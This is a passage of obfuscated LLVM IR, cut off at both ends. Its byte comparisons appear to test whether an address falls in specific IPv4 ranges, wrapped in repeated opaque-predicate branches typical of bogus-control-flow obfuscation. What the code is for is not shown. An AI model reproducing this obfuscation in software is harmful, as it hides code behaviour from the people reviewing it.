  %3464 = icmp eq i32 %3463, 0
  %3465 = icmp slt i32 %3460, 10
  %3466 = or i1 %3464, %3465
  br i1 %3466, label %originalBBpart2484, label %originalBB482alteredBB

originalBBpart2484:                               ; preds = %originalBB482
  br i1 %3458, label %3467, label %3471

; <label>:3467:                                   ; preds = %originalBBpart2484
  %3468 = load i8, i8* %12, align 1
  %3469 = zext i8 %3468 to i32
  %3470 = icmp slt i32 %3469, 255
  br i1 %3470, label %5259, label %3471

; <label>:3471:                                   ; preds = %3467, %originalBBpart2484, %originalBBpart2480, %3423
  %3472 = load i8, i8* %10, align 1
  %3473 = zext i8 %3472 to i32
  %3474 = icmp eq i32 %3473, 63
  br i1 %3474, label %3475, label %3487

; <label>:3475:                                   ; preds = %3471
  %3476 = load i8, i8* %11, align 1
  %3477 = zext i8 %3476 to i32
  %3478 = icmp eq i32 %3477, 251
  br i1 %3478, label %3479, label %3487

; <label>:3479:                                   ; preds = %3475
  %3480 = load i8, i8* %12, align 1
  %3481 = zext i8 %3480 to i32
  %3482 = icmp sge i32 %3481, 19
  br i1 %3482, label %3483, label %3487

; <label>:3483:                                   ; preds = %3479
  %3484 = load i8, i8* %12, align 1
  %3485 = zext i8 %3484 to i32
  %3486 = icmp slt i32 %3485, 21
  br i1 %3486, label %5259, label %3487

; <label>:3487:                                   ; preds = %3483, %3479, %3475, %3471
  %3488 = load i8, i8* %10, align 1
  %3489 = zext i8 %3488 to i32
  %3490 = icmp eq i32 %3489, 70
  br i1 %3490, label %3491, label %3535

; <label>:3491:                                   ; preds = %3487
  %3492 = load i32, i32* @x.57
  %3493 = load i32, i32* @y.58
  %3494 = sub i32 %3492, 1
  %3495 = mul i32 %3492, %3494
  %3496 = urem i32 %3495, 2
  %3497 = icmp eq i32 %3496, 0
  %3498 = icmp slt i32 %3493, 10
  %3499 = or i1 %3497, %3498
  br i1 %3499, label %originalBB486, label %originalBB486alteredBB

originalBB486:                                    ; preds = %originalBB486alteredBB, %3491
  %3500 = load i8, i8* %11, align 1
  %3501 = zext i8 %3500 to i32
  %3502 = icmp eq i32 %3501, 42
  %3503 = load i32, i32* @x.57
  %3504 = load i32, i32* @y.58
  %3505 = sub i32 %3503, 1
  %3506 = mul i32 %3503, %3505
  %3507 = urem i32 %3506, 2
  %3508 = icmp eq i32 %3507, 0
  %3509 = icmp slt i32 %3504, 10
  %3510 = or i1 %3508, %3509
  br i1 %3510, label %originalBBpart2488, label %originalBB486alteredBB

originalBBpart2488:                               ; preds = %originalBB486
  br i1 %3502, label %3511, label %3535

; <label>:3511:                                   ; preds = %originalBBpart2488
  %3512 = load i32, i32* @x.57
  %3513 = load i32, i32* @y.58
  %3514 = sub i32 %3512, 1
  %3515 = mul i32 %3512, %3514
  %3516 = urem i32 %3515, 2
  %3517 = icmp eq i32 %3516, 0
  %3518 = icmp slt i32 %3513, 10
  %3519 = or i1 %3517, %3518
  br i1 %3519, label %originalBB490, label %originalBB490alteredBB

originalBB490:                                    ; preds = %originalBB490alteredBB, %3511
  %3520 = load i8, i8* %12, align 1
  %3521 = zext i8 %3520 to i32
  %3522 = icmp sge i32 %3521, 73
  %3523 = load i32, i32* @x.57
  %3524 = load i32, i32* @y.58
  %3525 = sub i32 %3523, 1
  %3526 = mul i32 %3523, %3525
  %3527 = urem i32 %3526, 2
  %3528 = icmp eq i32 %3527, 0
  %3529 = icmp slt i32 %3524, 10
  %3530 = or i1 %3528, %3529
  br i1 %3530, label %originalBBpart2492, label %originalBB490alteredBB

originalBBpart2492:                               ; preds = %originalBB490
  br i1 %3522, label %3531, label %3535

; <label>:3531:                                   ; preds = %originalBBpart2492
  %3532 = load i8, i8* %12, align 1
  %3533 = zext i8 %3532 to i32
  %3534 = icmp slt i32 %3533, 75
  br i1 %3534, label %5259, label %3535

; <label>:3535:                                   ; preds = %3531, %originalBBpart2492, %originalBBpart2488, %3487
  %3536 = load i32, i32* @x.57
  %3537 = load i32, i32* @y.58
  %3538 = sub i32 %3536, 1
  %3539 = mul i32 %3536, %3538
  %3540 = urem i32 %3539, 2
  %3541 = icmp eq i32 %3540, 0
  %3542 = icmp slt i32 %3537, 10
  %3543 = or i1 %3541, %3542
  br i1 %3543, label %originalBB494, label %originalBB494alteredBB

originalBB494:                                    ; preds = %originalBB494alteredBB, %3535
  %3544 = load i8, i8* %10, align 1
  %3545 = zext i8 %3544 to i32
  %3546 = icmp eq i32 %3545, 74
  %3547 = load i32, i32* @x.57
  %3548 = load i32, i32* @y.58
  %3549 = sub i32 %3547, 1
  %3550 = mul i32 %3547, %3549
  %3551 = urem i32 %3550, 2
  %3552 = icmp eq i32 %3551, 0
  %3553 = icmp slt i32 %3548, 10
  %3554 = or i1 %3552, %3553
  br i1 %3554, label %originalBBpart2496, label %originalBB494alteredBB

originalBBpart2496:                               ; preds = %originalBB494
  br i1 %3546, label %3555, label %3599

; <label>:3555:                                   ; preds = %originalBBpart2496
  %3556 = load i32, i32* @x.57
  %3557 = load i32, i32* @y.58
  %3558 = sub i32 %3556, 1
  %3559 = mul i32 %3556, %3558
  %3560 = urem i32 %3559, 2
  %3561 = icmp eq i32 %3560, 0
  %3562 = icmp slt i32 %3557, 10
  %3563 = or i1 %3561, %3562
  br i1 %3563, label %originalBB498, label %originalBB498alteredBB

originalBB498:                                    ; preds = %originalBB498alteredBB, %3555
  %3564 = load i8, i8* %11, align 1
  %3565 = zext i8 %3564 to i32
  %3566 = icmp eq i32 %3565, 91
  %3567 = load i32, i32* @x.57
  %3568 = load i32, i32* @y.58
  %3569 = sub i32 %3567, 1
  %3570 = mul i32 %3567, %3569
  %3571 = urem i32 %3570, 2
  %3572 = icmp eq i32 %3571, 0
  %3573 = icmp slt i32 %3568, 10
  %3574 = or i1 %3572, %3573
  br i1 %3574, label %originalBBpart2500, label %originalBB498alteredBB

originalBBpart2500:                               ; preds = %originalBB498
  br i1 %3566, label %3575, label %3599

; <label>:3575:                                   ; preds = %originalBBpart2500
  %3576 = load i32, i32* @x.57
  %3577 = load i32, i32* @y.58
  %3578 = sub i32 %3576, 1
  %3579 = mul i32 %3576, %3578
  %3580 = urem i32 %3579, 2
  %3581 = icmp eq i32 %3580, 0
  %3582 = icmp slt i32 %3577, 10
  %3583 = or i1 %3581, %3582
  br i1 %3583, label %originalBB502, label %originalBB502alteredBB

originalBB502:                                    ; preds = %originalBB502alteredBB, %3575
  %3584 = load i8, i8* %12, align 1
  %3585 = zext i8 %3584 to i32
  %3586 = icmp sge i32 %3585, 113
  %3587 = load i32, i32* @x.57
  %3588 = load i32, i32* @y.58
  %3589 = sub i32 %3587, 1
  %3590 = mul i32 %3587, %3589
  %3591 = urem i32 %3590, 2
  %3592 = icmp eq i32 %3591, 0
  %3593 = icmp slt i32 %3588, 10
  %3594 = or i1 %3592, %3593
  br i1 %3594, label %originalBBpart2504, label %originalBB502alteredBB

originalBBpart2504:                               ; preds = %originalBB502
  br i1 %3586, label %3595, label %3599

; <label>:3595:                                   ; preds = %originalBBpart2504
  %3596 = load i8, i8* %12, align 1
  %3597 = zext i8 %3596 to i32
  %3598 = icmp slt i32 %3597, 115
  br i1 %3598, label %5259, label %3599

; <label>:3599:                                   ; preds = %3595, %originalBBpart2504, %originalBBpart2500, %originalBBpart2496
  %3600 = load i32, i32* @x.57
  %3601 = load i32, i32* @y.58
  %3602 = sub i32 %3600, 1
  %3603 = mul i32 %3600, %3602
  %3604 = urem i32 %3603, 2
  %3605 = icmp eq i32 %3604, 0
  %3606 = icmp slt i32 %3601, 10
  %3607 = or i1 %3605, %3606
  br i1 %3607, label %originalBB506, label %originalBB506alteredBB

originalBB506:                                    ; preds = %originalBB506alteredBB, %3599
  %3608 = load i8, i8* %10, align 1
  %3609 = zext i8 %3608 to i32
  %3610 = icmp eq i32 %3609, 74
  %3611 = load i32, i32* @x.57
  %3612 = load i32, i32* @y.58
  %3613 = sub i32 %3611, 1
  %3614 = mul i32 %3611, %3613
  %3615 = urem i32 %3614, 2
  %3616 = icmp eq i32 %3615, 0
  %3617 = icmp slt i32 %3612, 10
  %3618 = or i1 %3616, %3617
  br i1 %3618, label %originalBBpart2508, label %originalBB506alteredBB

originalBBpart2508:                               ; preds = %originalBB506
  br i1 %3610, label %3619, label %3663

; <label>:3619:                                   ; preds = %originalBBpart2508
  %3620 = load i32, i32* @x.57
  %3621 = load i32, i32* @y.58
  %3622 = sub i32 %3620, 1
  %3623 = mul i32 %3620, %3622
  %3624 = urem i32 %3623, 2
  %3625 = icmp eq i32 %3624, 0
  %3626 = icmp slt i32 %3621, 10
  %3627 = or i1 %3625, %3626
  br i1 %3627, label %originalBB510, label %originalBB510alteredBB

originalBB510:                                    ; preds = %originalBB510alteredBB, %3619
  %3628 = load i8, i8* %11, align 1
  %3629 = zext i8 %3628 to i32
  %3630 = icmp eq i32 %3629, 201
  %3631 = load i32, i32* @x.57
  %3632 = load i32, i32* @y.58
  %3633 = sub i32 %3631, 1
  %3634 = mul i32 %3631, %3633
  %3635 = urem i32 %3634, 2
  %3636 = icmp eq i32 %3635, 0
  %3637 = icmp slt i32 %3632, 10
  %3638 = or i1 %3636, %3637
  br i1 %3638, label %originalBBpart2512, label %originalBB510alteredBB

originalBBpart2512:                               ; preds = %originalBB510
  br i1 %3630, label %3639, label %3663

; <label>:3639:                                   ; preds = %originalBBpart2512
  %3640 = load i32, i32* @x.57
  %3641 = load i32, i32* @y.58
  %3642 = sub i32 %3640, 1
  %3643 = mul i32 %3640, %3642
  %3644 = urem i32 %3643, 2
  %3645 = icmp eq i32 %3644, 0
  %3646 = icmp slt i32 %3641, 10
  %3647 = or i1 %3645, %3646
  br i1 %3647, label %originalBB514, label %originalBB514alteredBB

originalBB514:                                    ; preds = %originalBB514alteredBB, %3639
  %3648 = load i8, i8* %12, align 1
  %3649 = zext i8 %3648 to i32
  %3650 = icmp sge i32 %3649, 56
  %3651 = load i32, i32* @x.57
  %3652 = load i32, i32* @y.58
  %3653 = sub i32 %3651, 1
  %3654 = mul i32 %3651, %3653
  %3655 = urem i32 %3654, 2
  %3656 = icmp eq i32 %3655, 0
  %3657 = icmp slt i32 %3652, 10
  %3658 = or i1 %3656, %3657
  br i1 %3658, label %originalBBpart2516, label %originalBB514alteredBB

originalBBpart2516:                               ; preds = %originalBB514
  br i1 %3650, label %3659, label %3663

; <label>:3659:                                   ; preds = %originalBBpart2516
  %3660 = load i8, i8* %12, align 1
  %3661 = zext i8 %3660 to i32
  %3662 = icmp slt i32 %3661, 58
  br i1 %3662, label %5259, label %3663

; <label>:3663:                                   ; preds = %3659, %originalBBpart2516, %originalBBpart2512, %originalBBpart2508
  %3664 = load i8, i8* %10, align 1
  %3665 = zext i8 %3664 to i32
  %3666 = icmp eq i32 %3665, 188
  br i1 %3666, label %3667, label %3695

; <label>:3667:                                   ; preds = %3663
  %3668 = load i32, i32* @x.57
  %3669 = load i32, i32* @y.58
  %3670 = sub i32 %3668, 1
  %3671 = mul i32 %3668, %3670
  %3672 = urem i32 %3671, 2
  %3673 = icmp eq i32 %3672, 0
  %3674 = icmp slt i32 %3669, 10
  %3675 = or i1 %3673, %3674
  br i1 %3675, label %originalBB518, label %originalBB518alteredBB

originalBB518:                                    ; preds = %originalBB518alteredBB, %3667
  %3676 = load i8, i8* %11, align 1
  %3677 = zext i8 %3676 to i32
  %3678 = icmp eq i32 %3677, 209
  %3679 = load i32, i32* @x.57
  %3680 = load i32, i32* @y.58
  %3681 = sub i32 %3679, 1
  %3682 = mul i32 %3679, %3681
  %3683 = urem i32 %3682, 2
  %3684 = icmp eq i32 %3683, 0
  %3685 = icmp slt i32 %3680, 10
  %3686 = or i1 %3684, %3685
  br i1 %3686, label %originalBBpart2520, label %originalBB518alteredBB

originalBBpart2520:                               ; preds = %originalBB518
  br i1 %3678, label %3687, label %3695

; <label>:3687:                                   ; preds = %originalBBpart2520
  %3688 = load i8, i8* %12, align 1
  %3689 = zext i8 %3688 to i32
  %3690 = icmp sge i32 %3689, 48
  br i1 %3690, label %3691, label %3695

; <label>:3691:                                   ; preds = %3687
  %3692 = load i8, i8* %12, align 1
  %3693 = zext i8 %3692 to i32
  %3694 = icmp slt i32 %3693, 53
  br i1 %3694, label %5259, label %3695

; <label>:3695:                                   ; preds = %3691, %3687, %originalBBpart2520, %3663
  %3696 = load i8, i8* %10, align 1
  %3697 = zext i8 %3696 to i32
  %3698 = icmp eq i32 %3697, 188
  br i1 %3698, label %3699, label %3703

; <label>:3699:                                   ; preds = %3695
  %3700 = load i8, i8* %11, align 1
  %3701 = zext i8 %3700 to i32
  %3702 = icmp eq i32 %3701, 165
  br i1 %3702, label %5259, label %3703

; <label>:3703:                                   ; preds = %3699, %3695
  %3704 = load i8, i8* %10, align 1
  %3705 = zext i8 %3704 to i32
  %3706 = icmp eq i32 %3705, 149
  br i1 %3706, label %3707, label %3727

; <label>:3707:                                   ; preds = %3703
  %3708 = load i32, i32* @x.57
  %3709 = load i32, i32* @y.58
  %3710 = sub i32 %3708, 1
  %3711 = mul i32 %3708, %3710
  %3712 = urem i32 %3711, 2
  %3713 = icmp eq i32 %3712, 0
  %3714 = icmp slt i32 %3709, 10
  %3715 = or i1 %3713, %3714
  br i1 %3715, label %originalBB522, label %originalBB522alteredBB

originalBB522:                                    ; preds = %originalBB522alteredBB, %3707
  %3716 = load i8, i8* %11, align 1
  %3717 = zext i8 %3716 to i32
  %3718 = icmp eq i32 %3717, 202
  %3719 = load i32, i32* @x.57
  %3720 = load i32, i32* @y.58
  %3721 = sub i32 %3719, 1
  %3722 = mul i32 %3719, %3721
  %3723 = urem i32 %3722, 2
  %3724 = icmp eq i32 %3723, 0
  %3725 = icmp slt i32 %3720, 10
  %3726 = or i1 %3724, %3725
  br i1 %3726, label %originalBBpart2524, label %originalBB522alteredBB

originalBBpart2524:                               ; preds = %originalBB522
  br i1 %3718, label %5259, label %3727

; <label>:3727:                                   ; preds = %originalBBpart2524, %3703
  %3728 = load i8, i8* %10, align 1
  %3729 = zext i8 %3728 to i32
  %3730 = icmp eq i32 %3729, 151
  br i1 %3730, label %3731, label %3735

; <label>:3731:                                   ; preds = %3727
  %3732 = load i8, i8* %11, align 1
  %3733 = zext i8 %3732 to i32
  %3734 = icmp eq i32 %3733, 80
  br i1 %3734, label %5259, label %3735

; <label>:3735:                                   ; preds = %3731, %3727
  %3736 = load i8, i8* %10, align 1
  %3737 = zext i8 %3736 to i32
  %3738 = icmp eq i32 %3737, 164
  br i1 %3738, label %3739, label %3743

; <label>:3739:                                   ; preds = %3735
  %3740 = load i8, i8* %11, align 1
  %3741 = zext i8 %3740 to i32
  %3742 = icmp eq i32 %3741, 132
  br i1 %3742, label %5259, label %3743

; <label>:3743:                                   ; preds = %3739, %3735
  %3744 = load i8, i8* %10, align 1
  %3745 = zext i8 %3744 to i32
  %3746 = icmp eq i32 %3745, 176
  br i1 %3746, label %3747, label %3751

; <label>:3747:                                   ; preds = %3743
  %3748 = load i8, i8* %11, align 1
  %3749 = zext i8 %3748 to i32
  %3750 = icmp eq i32 %3749, 31
  br i1 %3750, label %5259, label %3751

; <label>:3751:                                   ; preds = %3747, %3743
  %3752 = load i32, i32* @x.57
  %3753 = load i32, i32* @y.58
  %3754 = sub i32 %3752, 1
  %3755 = mul i32 %3752, %3754
  %3756 = urem i32 %3755, 2
  %3757 = icmp eq i32 %3756, 0
  %3758 = icmp slt i32 %3753, 10
  %3759 = or i1 %3757, %3758
  br i1 %3759, label %originalBB526, label %originalBB526alteredBB

originalBB526:                                    ; preds = %originalBB526alteredBB, %3751
  %3760 = load i8, i8* %10, align 1
  %3761 = zext i8 %3760 to i32
  %3762 = icmp eq i32 %3761, 167
  %3763 = load i32, i32* @x.57
  %3764 = load i32, i32* @y.58
  %3765 = sub i32 %3763, 1
  %3766 = mul i32 %3763, %3765
  %3767 = urem i32 %3766, 2
  %3768 = icmp eq i32 %3767, 0
  %3769 = icmp slt i32 %3764, 10
  %3770 = or i1 %3768, %3769
  br i1 %3770, label %originalBBpart2528, label %originalBB526alteredBB

originalBBpart2528:                               ; preds = %originalBB526
  br i1 %3762, label %3771, label %3775

; <label>:3771:                                   ; preds = %originalBBpart2528
  %3772 = load i8, i8* %11, align 1
  %3773 = zext i8 %3772 to i32
  %3774 = icmp eq i32 %3773, 114
  br i1 %3774, label %5259, label %3775

; <label>:3775:                                   ; preds = %3771, %originalBBpart2528
  %3776 = load i32, i32* @x.57
  %3777 = load i32, i32* @y.58
  %3778 = sub i32 %3776, 1
  %3779 = mul i32 %3776, %3778
  %3780 = urem i32 %3779, 2
  %3781 = icmp eq i32 %3780, 0
  %3782 = icmp slt i32 %3777, 10
  %3783 = or i1 %3781, %3782
  br i1 %3783, label %originalBB530, label %originalBB530alteredBB

originalBB530:                                    ; preds = %originalBB530alteredBB, %3775
  %3784 = load i8, i8* %10, align 1
  %3785 = zext i8 %3784 to i32
  %3786 = icmp eq i32 %3785, 178
  %3787 = load i32, i32* @x.57
  %3788 = load i32, i32* @y.58
  %3789 = sub i32 %3787, 1
  %3790 = mul i32 %3787, %3789
  %3791 = urem i32 %3790, 2
  %3792 = icmp eq i32 %3791, 0
  %3793 = icmp slt i32 %3788, 10
  %3794 = or i1 %3792, %3793
  br i1 %3794, label %originalBBpart2532, label %originalBB530alteredBB

originalBBpart2532:                               ; preds = %originalBB530
  br i1 %3786, label %3795, label %3799

; <label>:3795:                                   ; preds = %originalBBpart2532
  %3796 = load i8, i8* %11, align 1
  %3797 = zext i8 %3796 to i32
  %3798 = icmp eq i32 %3797, 32
  br i1 %3798, label %5259, label %3799

; <label>:3799:                                   ; preds = %3795, %originalBBpart2532
  %3800 = load i32, i32* @x.57
  %3801 = load i32, i32* @y.58
  %3802 = sub i32 %3800, 1
  %3803 = mul i32 %3800, %3802
  %3804 = urem i32 %3803, 2
  %3805 = icmp eq i32 %3804, 0
  %3806 = icmp slt i32 %3801, 10
  %3807 = or i1 %3805, %3806
  br i1 %3807, label %originalBB534, label %originalBB534alteredBB

originalBB534:                                    ; preds = %originalBB534alteredBB, %3799
  %3808 = load i8, i8* %10, align 1
  %3809 = zext i8 %3808 to i32
  %3810 = icmp eq i32 %3809, 178
  %3811 = load i32, i32* @x.57
  %3812 = load i32, i32* @y.58
  %3813 = sub i32 %3811, 1
  %3814 = mul i32 %3811, %3813
  %3815 = urem i32 %3814, 2
  %3816 = icmp eq i32 %3815, 0
  %3817 = icmp slt i32 %3812, 10
  %3818 = or i1 %3816, %3817
  br i1 %3818, label %originalBBpart2536, label %originalBB534alteredBB

originalBBpart2536:                               ; preds = %originalBB534
  br i1 %3810, label %3819, label %3839

; <label>:3819:                                   ; preds = %originalBBpart2536
  %3820 = load i32, i32* @x.57
  %3821 = load i32, i32* @y.58
  %3822 = sub i32 %3820, 1
  %3823 = mul i32 %3820, %3822
  %3824 = urem i32 %3823, 2
  %3825 = icmp eq i32 %3824, 0
  %3826 = icmp slt i32 %3821, 10
  %3827 = or i1 %3825, %3826
  br i1 %3827, label %originalBB538, label %originalBB538alteredBB

originalBB538:                                    ; preds = %originalBB538alteredBB, %3819
  %3828 = load i8, i8* %11, align 1
  %3829 = zext i8 %3828 to i32
  %3830 = icmp eq i32 %3829, 33
  %3831 = load i32, i32* @x.57
  %3832 = load i32, i32* @y.58
  %3833 = sub i32 %3831, 1
  %3834 = mul i32 %3831, %3833
  %3835 = urem i32 %3834, 2
  %3836 = icmp eq i32 %3835, 0
  %3837 = icmp slt i32 %3832, 10
  %3838 = or i1 %3836, %3837
  br i1 %3838, label %originalBBpart2540, label %originalBB538alteredBB

originalBBpart2540:                               ; preds = %originalBB538
  br i1 %3830, label %5259, label %3839

; <label>:3839:                                   ; preds = %originalBBpart2540, %originalBBpart2536
  %3840 = load i32, i32* @x.57
  %3841 = load i32, i32* @y.58
  %3842 = sub i32 %3840, 1
  %3843 = mul i32 %3840, %3842
  %3844 = urem i32 %3843, 2
  %3845 = icmp eq i32 %3844, 0
  %3846 = icmp slt i32 %3841, 10
  %3847 = or i1 %3845, %3846
  br i1 %3847, label %originalBB542, label %originalBB542alteredBB

originalBB542:                                    ; preds = %originalBB542alteredBB, %3839
  %3848 = load i8, i8* %10, align 1
  %3849 = zext i8 %3848 to i32
  %3850 = icmp eq i32 %3849, 37
  %3851 = load i32, i32* @x.57
  %3852 = load i32, i32* @y.58
  %3853 = sub i32 %3851, 1
  %3854 = mul i32 %3851, %3853
  %3855 = urem i32 %3854, 2
  %3856 = icmp eq i32 %3855, 0
  %3857 = icmp slt i32 %3852, 10
  %3858 = or i1 %3856, %3857
  br i1 %3858, label %originalBBpart2544, label %originalBB542alteredBB

originalBBpart2544:                               ; preds = %originalBB542
  br i1 %3850, label %3859, label %3879

; <label>:3859:                                   ; preds = %originalBBpart2544
  %3860 = load i32, i32* @x.57
  %3861 = load i32, i32* @y.58
  %3862 = sub i32 %3860, 1
  %3863 = mul i32 %3860, %3862
  %3864 = urem i32 %3863, 2
  %3865 = icmp eq i32 %3864, 0
  %3866 = icmp slt i32 %3861, 10
  %3867 = or i1 %3865, %3866
  br i1 %3867, label %originalBB546, label %originalBB546alteredBB

originalBB546:                                    ; preds = %originalBB546alteredBB, %3859
  %3868 = load i8, i8* %11, align 1
  %3869 = zext i8 %3868 to i32
  %3870 = icmp eq i32 %3869, 59
  %3871 = load i32, i32* @x.57
  %3872 = load i32, i32* @y.58
  %3873 = sub i32 %3871, 1
  %3874 = mul i32 %3871, %3873
  %3875 = urem i32 %3874, 2
  %3876 = icmp eq i32 %3875, 0
  %3877 = icmp slt i32 %3872, 10
  %3878 = or i1 %3876, %3877
  br i1 %3878, label %originalBBpart2548, label %originalBB546alteredBB

originalBBpart2548:                               ; preds = %originalBB546
  br i1 %3870, label %5259, label %3879

; <label>:3879:                                   ; preds = %originalBBpart2548, %originalBBpart2544
  %3880 = load i8, i8* %10, align 1
  %3881 = zext i8 %3880 to i32
  %3882 = icmp eq i32 %3881, 37
  br i1 %3882, label %3883, label %3887

; <label>:3883:                                   ; preds = %3879
  %3884 = load i8, i8* %11, align 1
  %3885 = zext i8 %3884 to i32
  %3886 = icmp eq i32 %3885, 187
  br i1 %3886, label %5259, label %3887

; <label>:3887:                                   ; preds = %3883, %3879
  %3888 = load i8, i8* %10, align 1
  %3889 = zext i8 %3888 to i32
  %3890 = icmp eq i32 %3889, 46
  br i1 %3890, label %3891, label %3911

; <label>:3891:                                   ; preds = %3887
  %3892 = load i32, i32* @x.57
  %3893 = load i32, i32* @y.58
  %3894 = sub i32 %3892, 1
  %3895 = mul i32 %3892, %3894
  %3896 = urem i32 %3895, 2
  %3897 = icmp eq i32 %3896, 0
  %3898 = icmp slt i32 %3893, 10
  %3899 = or i1 %3897, %3898
  br i1 %3899, label %originalBB550, label %originalBB550alteredBB

originalBB550:                                    ; preds = %originalBB550alteredBB, %3891
  %3900 = load i8, i8* %11, align 1
  %3901 = zext i8 %3900 to i32
  %3902 = icmp eq i32 %3901, 105
  %3903 = load i32, i32* @x.57
  %3904 = load i32, i32* @y.58
  %3905 = sub i32 %3903, 1
  %3906 = mul i32 %3903, %3905
  %3907 = urem i32 %3906, 2
  %3908 = icmp eq i32 %3907, 0
  %3909 = icmp slt i32 %3904, 10
  %3910 = or i1 %3908, %3909
  br i1 %3910, label %originalBBpart2552, label %originalBB550alteredBB

originalBBpart2552:                               ; preds = %originalBB550
  br i1 %3902, label %5259, label %3911

; <label>:3911:                                   ; preds = %originalBBpart2552, %3887
  %3912 = load i8, i8* %10, align 1
  %3913 = zext i8 %3912 to i32
  %3914 = icmp eq i32 %3913, 51
  br i1 %3914, label %3915, label %3935

; <label>:3915:                                   ; preds = %3911
  %3916 = load i32, i32* @x.57
  %3917 = load i32, i32* @y.58
  %3918 = sub i32 %3916, 1
  %3919 = mul i32 %3916, %3918
  %3920 = urem i32 %3919, 2
  %3921 = icmp eq i32 %3920, 0
  %3922 = icmp slt i32 %3917, 10
  %3923 = or i1 %3921, %3922
  br i1 %3923, label %originalBB554, label %originalBB554alteredBB

originalBB554:                                    ; preds = %originalBB554alteredBB, %3915
  %3924 = load i8, i8* %11, align 1
  %3925 = zext i8 %3924 to i32
  %3926 = icmp eq i32 %3925, 254
  %3927 = load i32, i32* @x.57
  %3928 = load i32, i32* @y.58
  %3929 = sub i32 %3927, 1
  %3930 = mul i32 %3927, %3929
  %3931 = urem i32 %3930, 2
  %3932 = icmp eq i32 %3931, 0
  %3933 = icmp slt i32 %3928, 10
  %3934 = or i1 %3932, %3933
  br i1 %3934, label %originalBBpart2556, label %originalBB554alteredBB

originalBBpart2556:                               ; preds = %originalBB554
  br i1 %3926, label %5259, label %3935

; <label>:3935:                                   ; preds = %originalBBpart2556, %3911
  %3936 = load i8, i8* %10, align 1
  %3937 = zext i8 %3936 to i32
  %3938 = icmp eq i32 %3937, 51
  br i1 %3938, label %3939, label %3943

; <label>:3939:                                   ; preds = %3935
  %3940 = load i8, i8* %11, align 1
  %3941 = zext i8 %3940 to i32
  %3942 = icmp eq i32 %3941, 255
  br i1 %3942, label %5259, label %3943

; <label>:3943:                                   ; preds = %3939, %3935
  %3944 = load i32, i32* @x.57
  %3945 = load i32, i32* @y.58
  %3946 = sub i32 %3944, 1
  %3947 = mul i32 %3944, %3946
  %3948 = urem i32 %3947, 2
  %3949 = icmp eq i32 %3948, 0
  %3950 = icmp slt i32 %3945, 10
  %3951 = or i1 %3949, %3950
  br i1 %3951, label %originalBB558, label %originalBB558alteredBB

originalBB558:                                    ; preds = %originalBB558alteredBB, %3943
  %3952 = load i8, i8* %10, align 1
  %3953 = zext i8 %3952 to i32
  %3954 = icmp eq i32 %3953, 5
  %3955 = load i32, i32* @x.57
  %3956 = load i32, i32* @y.58
  %3957 = sub i32 %3955, 1
  %3958 = mul i32 %3955, %3957
  %3959 = urem i32 %3958, 2
  %3960 = icmp eq i32 %3959, 0
  %3961 = icmp slt i32 %3956, 10
  %3962 = or i1 %3960, %3961
  br i1 %3962, label %originalBBpart2560, label %originalBB558alteredBB

originalBBpart2560:                               ; preds = %originalBB558
  br i1 %3954, label %3963, label %3983

; <label>:3963:                                   ; preds = %originalBBpart2560
  %3964 = load i32, i32* @x.57
  %3965 = load i32, i32* @y.58
  %3966 = sub i32 %3964, 1
  %3967 = mul i32 %3964, %3966
  %3968 = urem i32 %3967, 2
  %3969 = icmp eq i32 %3968, 0
  %3970 = icmp slt i32 %3965, 10
  %3971 = or i1 %3969, %3970
  br i1 %3971, label %originalBB562, label %originalBB562alteredBB

originalBB562:                                    ; preds = %originalBB562alteredBB, %3963
  %3972 = load i8, i8* %11, align 1
  %3973 = zext i8 %3972 to i32
  %3974 = icmp eq i32 %3973, 135
  %3975 = load i32, i32* @x.57
  %3976 = load i32, i32* @y.58
  %3977 = sub i32 %3975, 1
  %3978 = mul i32 %3975, %3977
  %3979 = urem i32 %3978, 2
  %3980 = icmp eq i32 %3979, 0
  %3981 = icmp slt i32 %3976, 10
  %3982 = or i1 %3980, %3981
  br i1 %3982, label %originalBBpart2564, label %originalBB562alteredBB

originalBBpart2564:                               ; preds = %originalBB562
  br i1 %3974, label %5259, label %3983

; <label>:3983:                                   ; preds = %originalBBpart2564, %originalBBpart2560
  %3984 = load i32, i32* @x.57
  %3985 = load i32, i32* @y.58
  %3986 = sub i32 %3984, 1
  %3987 = mul i32 %3984, %3986
  %3988 = urem i32 %3987, 2
  %3989 = icmp eq i32 %3988, 0
  %3990 = icmp slt i32 %3985, 10
  %3991 = or i1 %3989, %3990
  br i1 %3991, label %originalBB566, label %originalBB566alteredBB

originalBB566:                                    ; preds = %originalBB566alteredBB, %3983
  %3992 = load i8, i8* %10, align 1
  %3993 = zext i8 %3992 to i32
  %3994 = icmp eq i32 %3993, 5
  %3995 = load i32, i32* @x.57
  %3996 = load i32, i32* @y.58
  %3997 = sub i32 %3995, 1
  %3998 = mul i32 %3995, %3997
  %3999 = urem i32 %3998, 2
  %4000 = icmp eq i32 %3999, 0
  %4001 = icmp slt i32 %3996, 10
  %4002 = or i1 %4000, %4001
  br i1 %4002, label %originalBBpart2568, label %originalBB566alteredBB

originalBBpart2568:                               ; preds = %originalBB566
  br i1 %3994, label %4003, label %4007

; <label>:4003:                                   ; preds = %originalBBpart2568
  %4004 = load i8, i8* %11, align 1
  %4005 = zext i8 %4004 to i32
  %4006 = icmp eq i32 %4005, 196
  br i1 %4006, label %5259, label %4007

; <label>:4007:                                   ; preds = %4003, %originalBBpart2568
  %4008 = load i8, i8* %10, align 1
  %4009 = zext i8 %4008 to i32
  %4010 = icmp eq i32 %4009, 5
  br i1 %4010, label %4011, label %4015

; <label>:4011:                                   ; preds = %4007
  %4012 = load i8, i8* %11, align 1
  %4013 = zext i8 %4012 to i32
  %4014 = icmp eq i32 %4013, 39
  br i1 %4014, label %5259, label %4015

; <label>:4015:                                   ; preds = %4011, %4007
  %4016 = load i8, i8* %10, align 1
  %4017 = zext i8 %4016 to i32
  %4018 = icmp eq i32 %4017, 91
  br i1 %4018, label %4019, label %4023

; <label>:4019:                                   ; preds = %4015
  %4020 = load i8, i8* %11, align 1
  %4021 = zext i8 %4020 to i32
  %4022 = icmp eq i32 %4021, 134
  br i1 %4022, label %5259, label %4023

; <label>:4023:                                   ; preds = %4019, %4015
  %4024 = load i32, i32* @x.57
  %4025 = load i32, i32* @y.58
  %4026 = sub i32 %4024, 1
  %4027 = mul i32 %4024, %4026
  %4028 = urem i32 %4027, 2
  %4029 = icmp eq i32 %4028, 0
  %4030 = icmp slt i32 %4025, 10
  %4031 = or i1 %4029, %4030
  br i1 %4031, label %originalBB570, label %originalBB570alteredBB

originalBB570:                                    ; preds = %originalBB570alteredBB, %4023
  %4032 = load i8, i8* %10, align 1
